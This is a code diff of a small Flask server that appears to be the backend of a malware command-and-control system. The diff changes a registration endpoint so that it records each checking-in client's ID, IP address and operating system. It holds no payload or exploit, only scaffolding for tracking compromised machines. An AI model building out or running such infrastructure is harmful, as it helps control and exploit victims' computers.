@@ -1,12 +1,9 @@
 from flask import Flask, request
 import uuid
-import random
-import json
 import fileOps
 
 app = Flask(__name__)
 
-random.seed(10)
 @app.route("/clients")
 def all_clients():
     return fileOps.get_malwares()
@@ -19,20 +16,20 @@ def get_log():
 def connect():
     return "this is a log"
 
-@app.route("/registry")
+@app.route("/register", methods=['POST'])
 def registry():
 
     malwareRegistry = str(uuid.uuid1().int)
+    form_data = request.form.to_dict()
 
-    malware = {
+    malware_entry = {
         "id": malwareRegistry,
         "ip": request.remote_addr,
-        "signature" : ""
+        "os_signature": form_data['OS'],
     }
     
-    entry = json.dumps(malware)
 
-    fileOps.add_malware(entry)
+    fileOps.add_malware(malware_entry)
 
     return malwareRegistry
     
